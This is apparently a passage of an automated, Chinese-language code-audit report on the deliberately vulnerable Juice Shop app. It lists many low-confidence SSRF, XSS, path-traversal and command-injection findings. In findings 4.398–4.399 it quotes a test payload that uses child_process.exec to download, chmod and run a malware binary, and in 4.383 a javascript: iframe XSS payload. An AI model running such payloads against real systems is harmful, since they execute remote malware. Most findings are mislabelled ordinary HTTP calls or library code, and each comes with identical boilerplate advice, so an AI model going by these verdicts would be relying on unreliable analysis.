### 4.326 SSRF（LOW）

- 文件：`frontend/src/app/Services/challenge.service.ts:39`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/continue-code-fixIt').pipe(map((response: any) => response.continueCode), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.327 SSRF（LOW）

- 文件：`frontend/src/app/Services/code-fixes.service.ts:29`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + `/${key}`).pipe(map((response: Fixes) => response), catchError((error: any) => { throw error }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.328 SSRF（LOW）

- 文件：`frontend/src/app/Services/complaint.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/', params).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.329 SSRF（LOW）

- 文件：`frontend/src/app/Services/country-mapping.service.ts:20`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/country-mapping').pipe(catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.330 SSRF（LOW）

- 文件：`frontend/src/app/Services/data-subject.service.ts:22`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/erasure-request', params).pipe(catchError((error: Error) => { throw error })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.331 SSRF（LOW）

- 文件：`frontend/src/app/Services/data-subject.service.ts:27`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/data-export', params).pipe(catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.332 SSRF（LOW）

- 文件：`frontend/src/app/Services/delivery.service.ts:37`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.host}/${id}`).pipe(map((response: DeliverySingleMethodResponse) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.333 SSRF（LOW）

- 文件：`frontend/src/app/Services/feedback.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/', {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.334 SSRF（LOW）

- 文件：`frontend/src/app/Services/feedback.service.ts:27`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/', params).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.335 SSRF（LOW）

- 文件：`frontend/src/app/Services/hint.service.ts:23`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/').pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.336 SSRF（LOW）

- 文件：`frontend/src/app/Services/image-captcha.service.ts:20`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/image-captcha/').pipe(catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.337 SSRF（LOW）

- 文件：`frontend/src/app/Services/keys.service.ts:16`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/nftUnlocked').pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.338 SSRF（LOW）

- 文件：`frontend/src/app/Services/keys.service.ts:25`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/nftMintListen').pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.339 SSRF（LOW）

- 文件：`frontend/src/app/Services/keys.service.ts:34`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/api/Challenges/?key=nftMintChallenge').pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.340 SSRF（LOW）

- 文件：`frontend/src/app/Services/keys.service.ts:45`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(endpoint, params).pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.341 SSRF（LOW）

- 文件：`frontend/src/app/Services/keys.service.ts:56`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(endpoint, params).pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.342 SSRF（LOW）

- 文件：`frontend/src/app/Services/keys.service.ts:67`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(endpoint, params).pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.343 SSRF（LOW）

- 文件：`frontend/src/app/Services/languages.service.ts:20`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.hostServer}/rest/languages`).pipe(catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.344 Path Traversal（LOW）

- 文件：`frontend/src/app/Services/local-backup.service.ts:76`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const snackBarRef = this.snackBar.open('Backup has been restored from ' + backupFile.name, 'Apply changes now', {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.345 Path Traversal（LOW）

- 文件：`frontend/src/app/Services/local-backup.service.ts:92`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
this.snackBarHelperService.open(`Version ${backup.version} is incompatible with expected version ${this.VERSION}`, 'errorBar')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.346 Path Traversal（LOW）

- 文件：`frontend/src/app/Services/local-backup.service.ts:95`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
this.snackBarHelperService.open(`Backup restore operation failed: ${err.message}`, 'errorBar')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.347 SSRF（LOW）

- 文件：`frontend/src/app/Services/order-history.service.ts:25`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/orders').pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.348 SSRF（LOW）

- 文件：`frontend/src/app/Services/payment.service.ts:26`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.host}/${id}`).pipe(map((response: any) => response.data), catchError((err: Error) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.349 SSRF（LOW）

- 文件：`frontend/src/app/Services/payment.service.ts:30`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/', params).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.350 SSRF（LOW）

- 文件：`frontend/src/app/Services/photo-wall.service.ts:28`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/').pipe(map((response: any) => response.data), catchError((err: Error) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.351 SSRF（LOW）

- 文件：`frontend/src/app/Services/product-review.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.host}/${id}/reviews`).pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.352 SSRF（LOW）

- 文件：`frontend/src/app/Services/product-review.service.ts:39`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/reviews', { id: _id }).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.353 SSRF（LOW）

- 文件：`frontend/src/app/Services/product.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.hostServer}/rest/products/search?q=${criteria}`).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.354 SSRF（LOW）

- 文件：`frontend/src/app/Services/product.service.ts:25`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/', { params }).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.355 SSRF（LOW）

- 文件：`frontend/src/app/Services/product.service.ts:29`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.host}/${id}?d=${encodeURIComponent(new Date().toDateString())}`).pipe(map((response: any) =>
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.356 SSRF（LOW）

- 文件：`frontend/src/app/Services/quantity.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/').pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.357 SSRF（LOW）

- 文件：`frontend/src/app/Services/recycle.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/', {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.358 SSRF（LOW）

- 文件：`frontend/src/app/Services/recycle.service.ts:27`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/', params).pipe(map((response: any) => response.data), catchError((error) => { throw error }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.359 SSRF（LOW）

- 文件：`frontend/src/app/Services/security-answer.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/', params).pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.360 SSRF（LOW）

- 文件：`frontend/src/app/Services/security-question.service.ts:21`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.host + '/', { params }).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.361 SSRF（LOW）

- 文件：`frontend/src/app/Services/security-question.service.ts:25`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/' + 'rest/user/security-question?email=' + email).pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.362 SSRF（LOW）

- 文件：`frontend/src/app/Services/track-order.service.ts:22`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.host}/${params}`).pipe(map((response: any) => response), catchError((error) => { throw error }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.363 SSRF（LOW）

- 文件：`frontend/src/app/Services/two-factor-auth-service.ts:49`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(`${environment.hostServer}/rest/2fa/setup`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.364 SSRF（LOW）

- 文件：`frontend/src/app/Services/two-factor-auth-service.ts:57`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(`${environment.hostServer}/rest/2fa/disable`, { password })
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.365 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:29`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/user/authentication-details/', { params }).pipe(map((response: any) =>
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.366 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:34`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(`${this.host}/${id}`).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.367 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:38`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.host + '/', params).pipe(
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.368 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:46`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.hostServer + '/rest/user/login', params).pipe(map((response: any) => response.authentication), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.369 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:54`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/user/change-password?current=' + passwords.current + '&new=' +
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.370 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:59`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.hostServer + '/rest/user/reset-password', params).pipe(map((response: any) => response.user), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.371 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:64`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/user/whoami' + queryParam).pipe(map((response: any) => response.user), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.372 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:68`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get('https://www.googleapis.com/oauth2/v1/userinfo?alt=json&access_token=' + accessToken)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.373 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:72`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/saveLoginIp').pipe(map((response: any) => response), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.374 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:76`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.get(this.hostServer + '/rest/deluxe-membership').pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.375 SSRF（LOW）

- 文件：`frontend/src/app/Services/user.service.ts:80`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
return this.http.post(this.hostServer + '/rest/deluxe-membership', { paymentMode, paymentId }).pipe(map((response: any) => response.data), catchError((err) => { throw err }))
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.376 XSS（LOW）

- 文件：`frontend/src/assets/private/dat.gui.min.js:1`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
var dat=dat||{};dat.gui=dat.gui||{};dat.utils=dat.utils||{};dat.controllers=dat.controllers||{};dat.dom=dat.dom||{};dat.color=dat.color||{};dat.utils.css=function(){return{load:function(e,a){a=a||docu
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.377 XSS（LOW）

- 文件：`frontend/src/assets/private/dat.gui.min.js:13`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
dat.controllers.OptionController=function(e,a,b){var d=function(f,c,e){d.superclass.call(this,f,c);var k=this;this.__select=document.createElement("select");if(b.isArray(e)){var l={};b.each(e,function
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.378 XSS（LOW）

- 文件：`frontend/src/assets/private/stats.min.js:3`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
i.innerHTML="FPS";a.appendChild(i);var c=document.createElement("div");c.id="fpsGraph";c.style.cssText="position:relative;width:74px;height:30px;background-color:#0ff";for(a.appendChild(c);74>c.childr
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.379 XSS（LOW）

- 文件：`frontend/src/assets/private/stats.min.js:4`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
k.id="msText";k.style.cssText="color:#0f0;font-family:Helvetica,Arial,sans-serif;font-size:9px;font-weight:bold;line-height:15px";k.innerHTML="MS";d.appendChild(k);var e=document.createElement("div");
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.380 Command Injection（LOW）

- 文件：`frontend/src/assets/private/three.js:310`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
var color = /^rgb\((\d+), ?(\d+), ?(\d+)\)$/i.exec( style );
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.381 Command Injection（LOW）

- 文件：`frontend/src/assets/private/three.js:324`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
var color = /^rgb\((\d+)\%, ?(\d+)\%, ?(\d+)\%\)$/i.exec( style );
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.382 XSS（LOW）

- 文件：`frontend/src/hacking-instructor/challenges/bonusPayload.ts:33`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
resolved: waitForElementsInnerHtmlToBe('#searchValue', '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.sound
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.383 XSS（LOW）

- 文件：`frontend/src/hacking-instructor/challenges/domXss.ts:99`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
resolved: waitForElementsInnerHtmlToBe('#searchValue', '<iframe src="javascript:alert(`xss`)"></iframe>')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.384 Command Injection（LOW）

- 文件：`lib/codingChallenges.ts:76`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
if (new RegExp(`vuln-code-snippet vuln-line.*${challengeKey}`).exec(lines[i]) != null) {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.385 Command Injection（LOW）

- 文件：`lib/codingChallenges.ts:78`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
} else if (new RegExp(`vuln-code-snippet neutral-line.*${challengeKey}`).exec(lines[i]) != null) {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.386 XSS（LOW）

- 文件：`routes/chat.ts:241`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
res.write(`data: ${JSON.stringify({ choices: [{ finish_reason: event.finishReason }] })}\n\n`)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.387 XSS（LOW）

- 文件：`routes/chat.ts:255`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
res.write(`data: ${JSON.stringify({ error: `LLM error: ${event.error as string}` })}\n\n`)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.388 XSS（LOW）

- 文件：`routes/chat.ts:264`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
res.write(`data: ${JSON.stringify({ error: 'LLM API is not reachable' })}\n\n`)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.389 Path Traversal（LOW）

- 文件：`routes/languages.ts:31`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const content = await readFile('frontend/dist/frontend/assets/i18n/' + fileName, 'utf-8')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.390 Path Traversal（LOW）

- 文件：`routes/languages.ts:40`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const backendContent = await readFile('i18n/' + fileName, 'utf-8')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.391 XSS（LOW）

- 文件：`routes/videoHandler.ts:72`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
res.send(compiledTemplate)
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.392 SSRF（LOW）

- 文件：`test/cypress/e2e/basket.spec.ts:59`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
await fetch(`${Cypress.config('baseUrl')}/api/BasketItems/`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.393 SSRF（LOW）

- 文件：`test/cypress/e2e/complain.spec.ts:24`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
await fetch(`${Cypress.config('baseUrl')}/file-upload`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.394 SSRF（LOW）

- 文件：`test/cypress/e2e/complain.spec.ts:41`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
await fetch(`${Cypress.config('baseUrl')}/file-upload`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.395 SSRF（LOW）

- 文件：`test/cypress/e2e/contact.spec.ts:206`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
await fetch(`${Cypress.config('baseUrl')}/api/Feedbacks`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.396 SSRF（LOW）

- 文件：`test/cypress/e2e/dataErasure.spec.ts:11`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const response = await fetch(`${Cypress.config('baseUrl')}/dataerasure`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.397 SSRF（LOW）

- 文件：`test/cypress/e2e/noSql.spec.ts:58`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
await fetch(`${Cypress.config('baseUrl')}/rest/products/reviews`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.398 Command Injection（LOW）

- 文件：`test/cypress/e2e/profile.spec.ts:55`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
"#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.399 Path Traversal（LOW）

- 文件：`test/cypress/e2e/profile.spec.ts:55`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
"#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}",
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.400 SSRF（LOW）

- 文件：`test/cypress/e2e/profile.spec.ts:101`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const response = await fetch(`${Cypress.config('baseUrl')}/profile`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.401 SSRF（LOW）

- 文件：`test/cypress/e2e/register.spec.ts:52`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const response = await fetch(`${Cypress.config('baseUrl')}/api/Users/`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.402 SSRF（LOW）

- 文件：`test/cypress/e2e/register.spec.ts:76`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const response = await fetch(`${Cypress.config('baseUrl')}/api/Users/`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.403 SSRF（LOW）

- 文件：`test/cypress/e2e/register.spec.ts:98`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
const response = await fetch(`${Cypress.config('baseUrl')}/api/Users`, {
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。




### 4.404 XSS（LOW）

- 文件：`test/files/encrypt.py:14`
- 来源：custom-taint
- 置信度：0.5
- 已验证：否
- 状态：needs_review

```text
encrypted_document.write(str(pow(ord(char), e, N)) + '\n')
```

**修复建议：** 使用参数化查询、输入白名单校验、安全 API、最小权限和统一异常处理等方式进行加固。





## 5. 关键风险

- HIGH run-shell-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www-legacy.yml:36，状态为 needs_review。
- HIGH run-shell-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www.yml:27，状态为 needs_review。
- HIGH run-shell-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\.github\workflows\update-challenges-www.yml:36，状态为 needs_review。
- HIGH express-sequelize-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\dbSchemaChallenge_1.ts:5，状态为 needs_review。
- HIGH express-sequelize-injection 位于 C:\Users\52697\Desktop\2026小学期\AuditAgentX\data\projects\proj_27e19404\data\static\codefixes\dbSchemaChallenge_3.ts:11，状态为 needs_review。


## 6. 修改建议

- **P0 优先修复 Critical/High 漏洞：** 先处理已确认、已复现或处于核心入口路径上的高危问题，修复后重新扫描并保留复测证据。
- **P1 按漏洞类型批量治理：** 对 SQL 注入、命令注入、路径遍历等同类问题统一采用参数化查询、白名单校验和安全 API。
